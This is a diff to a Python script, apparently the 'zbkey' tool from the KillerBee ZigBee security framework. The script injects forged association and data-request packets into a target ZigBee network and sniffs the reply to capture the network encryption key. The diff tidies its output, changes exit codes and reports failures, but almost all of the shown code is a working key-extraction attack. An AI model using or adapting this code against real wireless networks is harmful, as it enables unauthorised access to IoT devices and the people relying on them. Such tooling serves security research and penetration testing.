@@ -19,7 +19,6 @@ Version:        BETA
 
 Usage: ./zbkey -f [channel] -s 0.1 -p [PANID] -a [IEEE64bitaddress] -i [deviceid]
     """
-dev_short_addr = None
 
 def show_dev():
     '''Prints the list of connected devices to stdout.'''
@@ -33,7 +32,7 @@ def interrupt(signum, frame):
     global kb
     kb.close()
     print "Exiting..."
-    sys.exit(0)
+    sys.exit(2)
 
 def associate_response_handle(packet):
     #TODO link to the correct part of the specification for this frame
@@ -49,8 +48,7 @@ def associate_response_handle(packet):
     if len(packet) > 21:
         #TODO mark up what these offsets are
         if packet[21] == '\x02':
-            dev_short_addr = packet[22:24]
-            return dev_short_addr
+            return packet[22:24] #device's short address
     return None   
 
 
@@ -81,7 +79,7 @@ arg_delay = 4
 # Parameters to build association packet
 arg_IEE64addr = None    #May be specified on command line
 arg_panID = None        #May be specified on command line
-ASSOC_SEQNUM = '\xc2'
+ASSOC_SEQNUM = '\x00'
 ASSOC_DST = '\x00\x00'
 ASSOC_SRC_PANID = '\xff\xff'
 ASSOC_ALLOC_ADDR = '\x84' #?
@@ -135,29 +133,28 @@ if arg_IEE64addr == None or len(arg_IEE64addr) != 8:
 kb = KillerBee(device=arg_devstring)
 signal.signal(signal.SIGINT, interrupt)
 kb.set_channel(arg_channel)
-start = time.time()
 
 #./zbkey -f 14 -R test1 -s 0.1 -p aa1a -a 0fc8071c08c25100 -i [deviceid]
 
-#TODO verify input args used as hex and convert to byte strings when parsing cmd line
 # Build the packet we use to request association
 assoc_packet = '\x23\xc8'+ASSOC_SEQNUM+arg_panID+ASSOC_DST+ASSOC_SRC_PANID+arg_IEE64addr+'\x01'+ASSOC_ALLOC_ADDR # associate packet 
 # Build the data packet sent after the association response is received
 data_assoc_packet  = '\x63\xc8'+ASSOC_DATA_SEQNUM+arg_panID+ASSOC_DST+arg_IEE64addr+'\x04' #data packet after association        
 
 # sent associate packet
-print "Assoc packet:"
-print kbutils.hexdump(assoc_packet)
+print "Sending association packet..."
+#print kbutils.hexdump(assoc_packet)
 kb.inject(assoc_packet)
 
 time.sleep(0.5)
 # send data after association packet
-print "Data_Assoc packet:"
-print kbutils.hexdump(data_assoc_packet)
+print "Sending data request packet..."
+#print kbutils.hexdump(data_assoc_packet)
 kb.inject(data_assoc_packet)
- 
-value = None   
+
 # receiving the association response and setting the device_short_address
+value = None
+start = time.time()
 while (start+arg_delay > time.time()):		
     # Does not block            
     recvpkt = kb.pnext()            
@@ -170,11 +167,16 @@ while (start+arg_delay > time.time()):
             kb.sniffer_off() # sniffer needs to be turned off
             break
 
-#create data_key packet
+if value == None:
+    print "Sorry, we didn't hear a device respond. Do you have an active target within range?"
+    kb.close()
+    sys.exit(1)
+
+# create data_key packet
 if value != None:
     data_key_packet = '\x63\x88'+DATA_KEY_SEQNUM+arg_panID+ASSOC_DST+value+'\x04' # data packet after association response 
-    print "Data_Key packet:"
-    print kbutils.hexdump(data_key_packet)
+    print "Sending the data key packet..."
+    #print kbutils.hexdump(data_key_packet)
     kb.inject(data_key_packet)
 
     start = time.time()
@@ -186,10 +188,13 @@ if value != None:
         if recvpkt != None and recvpkt['validcrc']:
             receivedKey = transport_response_handle(recvpkt['bytes']) 
             if receivedKey != None:
-                print "Received key: {:x}".format(receivedKey) 
-                kb.sniffer_off()
-                sys.exit(1)  
-                break
+                print "Received key: {0}".format(receivedKey.encode("hex"))
+                kb.close()
+                sys.exit(0)
+
+    if receivedKey == None:
+        print "Sorry, we didn't get a key. The effectiveness of this attack depends highly on the configuration of the target network."
 
 kb.close()
+sys.exit(1)
 
